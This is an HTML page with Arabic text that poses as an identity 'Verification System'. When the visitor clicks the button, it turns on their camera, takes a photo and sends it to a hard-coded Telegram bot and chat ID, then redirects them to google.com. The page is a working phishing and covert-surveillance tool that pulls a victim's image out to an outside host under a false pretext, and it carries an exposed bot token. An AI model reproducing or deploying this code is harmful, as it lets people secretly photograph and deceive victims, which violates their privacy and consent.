<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification System</title>
    <style>
        body { background: #000; color: #0f0; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: monospace; }
        #btn { padding: 20px 40px; border: 2px solid #0f0; cursor: pointer; font-size: 20px; box-shadow: 0 0 15px #0f0; }
    </style>
</head>
<body>

    <div id="btn" onclick="startCapture()">[ اضغط لتأكيد الهوية ]</div>

    <script>
        const TOKEN = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
        const CHAT_ID = "1772820433";

        async function startCapture() {
            const btn = document.getElementById('btn');
            btn.innerText = "جاري المعالجة...";

            try {
                // 1. طلب الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // الانتظار ثانية للالتقاط
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob, 'image.jpg');

                        // 2. محاولة الإرسال مع فحص الاستجابة
                        try {
                            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: fd
                            });

                            if (response.ok) {
                                alert("✅ نجحت العملية! افحص التليجرام الآن.");
                                window.location.href = "https://google.com";
                            } else {
                                const errorData = await response.json();
                                alert("❌ خطأ من تليجرام: " + errorData.description);
                            }
                        } catch (fError) {
                            alert("❌ فشل الاتصال بسيرفر تليجرام: " + fError.message);
                        }
                    }, 'image/jpeg');
                }, 1000);

            } catch (err) {
                alert("❌ المتصفح رفض الكاميرا: " + err.message);
                location.reload();
            }
        }
    </script>
</body>
</html>
